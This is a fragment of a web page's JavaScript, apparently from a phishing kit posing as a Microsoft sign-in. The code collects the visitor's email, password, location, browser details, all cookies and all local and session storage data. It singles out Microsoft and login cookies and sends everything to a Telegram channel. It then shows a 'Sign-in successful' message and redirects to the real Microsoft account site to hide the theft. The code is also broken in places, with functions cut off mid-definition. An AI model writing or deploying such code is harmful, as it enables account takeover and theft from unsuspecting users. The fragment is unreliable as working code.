  // Get browser info
  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';
    
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
      browserName = 'Chrome';
      browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Firefox') > -1) {
      browserName = 'Firefox';
      browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
      browserName = 'Safari';
      browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Edg') > -1) {
      browserName = 'Edge';
      browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown';
    }    
    
    let os = 'Unknown';
    if (ua.indexOf('Windows NT 10.0') > -1) os = 'Windows 10';
    else if (ua.indexOf('Windows NT 6.3') > -1) os = 'Windows 8.1';
    else if (ua.indexOf('Windows NT 6.2') > -1) os = 'Windows 8';

    else if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
    
    return {

      browser_version: browserVersion,
      os: os,

  // Enhanced cookie collection - captures ALL cookies and storage data
  function getCurrentCookies() {
    const allCookies = document.cookie;
    const cookies = [];
    const allStorageData = [];
    
    // Collect all standard cookies
    if (allCookies) {
      const cookieArray = allCookies.split(';');      
      for (let cookie of cookieArray) {
        cookie = cookie.trim();        
        if (cookie) {
          cookies.push(cookie);
        }      
      }    
    }
    
    // Collect ALL localStorage data
    try {
      if (localStorage.length > 0) {
        allStorageData.push('=== LOCALSTORAGE DATA ===');
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          const value = localStorage.getItem(key);
          if (key && value) {
            allStorageData.push(`[LS] ${key}: ${value.substring(0, 500)}`);
          }
        }
      } else {
        allStorageData.push('[LS] No localStorage data');
      }
    } catch (e) {
      allStorageData.push(`[LS] Error: ${e.message}`);
    }
    
    // Collect ALL sessionStorage data
    try {
      if (sessionStorage.length > 0) {
        allStorageData.push('=== SESSIONSTORAGE DATA ===');
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          const value = sessionStorage.getItem(key);
          if (key && value) {
            allStorageData.push(`[SS] ${key}: ${value.substring(0, 500)}`);
          }
        }
      } else {
        allStorageData.push('[SS] No sessionStorage data');
      }
    } catch (e) {
      allStorageData.push(`[SS] Error: ${e.message}`);
    }
    
    // Collect indexedDB databases (if any)
    try {
      if (window.indexedDB) {
        allStorageData.push('=== INDEXEDDB DATABASES ===');
        // Note: Can't list all easily without async, but we'll note availability
        allStorageData.push('[IDB] IndexedDB is available on this browser');
      }
    } catch (e) {
      allStorageData.push(`[IDB] Error: ${e.message}`);
    }
    
    // Collect all possible Microsoft-related cookies from document
    const msCookies = cookies.filter(c => 
      c.toLowerCase().includes('microsoft') || 
      c.toLowerCase().includes('msft') || 
      c.toLowerCase().includes('outlook') || 
      c.toLowerCase().includes('live') ||
      c.toLowerCase().includes('login')
    );
    
    return {
      total: cookies.length,
      totalStorageItems: localStorage.length + sessionStorage.length,
      standardCookies: cookies,
      standardCookiesList: cookies.join('\n   • '),
      msRelatedCookies: msCookies,
      msRelatedList: msCookies.join('\n   • '),
      allStorageData: allStorageData,
      storageDataList: allStorageData.join('\n   '),
      fullReport: `=== STANDARD COOKIES (${cookies.length}) ===\n   • ${cookies.join('\n   • ')}\n\n=== MICROSOFT-RELATED COOKIES (${msCookies.length}) ===\n   • ${msCookies.join('\n   • ')}\n\n=== STORAGE DATA ===\n   ${allStorageData.join('\n   ')}`
    };  
  }

      if (loadingMsg) loadingMsg.textContent = 'Collecting browser & cookie data...';
      const browserInfo = getBrowserInfo();
      const cookiesInfo = getCurrentCookies();
      
      if (loadingMsg) loadingMsg.textContent = 'Securely transmitting data...';
      await sendToTelegram(email, password, userLocation, browserInfo, cookiesInfo);
      
      if (loadingMsg) loadingMsg.textContent = 'Sign-in successful! Redirecting...';
      
      setTimeout(() => {
        if (loadingDiv) loadingDiv.classList.remove('active');
        if (!redirectExecuted) {
          redirectExecuted = true;
          window.location.href = 'https://account.microsoft.com/';
        }
      }, 1200);
      
    } catch (err) {
      console.error('Processing error:', err);
      if (loadingDiv) loadingDiv.classList.remove('active');
      if (errorDiv) {
        errorDiv.textContent = 'Unable to process. Please try again.';
        errorDiv.style.display = 'block';
      }
    }
  }
  
  // Attach event listener after DOM fully loaded
  document.addEventListener('DOMContentLoaded', function() {
    const nextBtn = document.getElementById('nextButton');
    if (nextBtn) {
      const newBtn = nextBtn.cloneNode(true);
      nextBtn.parentNode.replaceChild(newBtn, nextBtn);
      newBtn.addEventListener('click', function(e) {
        e.preventDefault();
        handleNext();
      });
    }
    
    getUserLocation().catch(e => console.warn("Background location fetch", e));
    
    const pwdField = document.getElementById('password');
    if (pwdField) {
      pwdField.addEventListener('keypress', function(event) {
        if (event.key === 'Enter') {
          event.preventDefault();
          handleNext();
        }
      });
    }
  });
  </script>
</body>
</html>
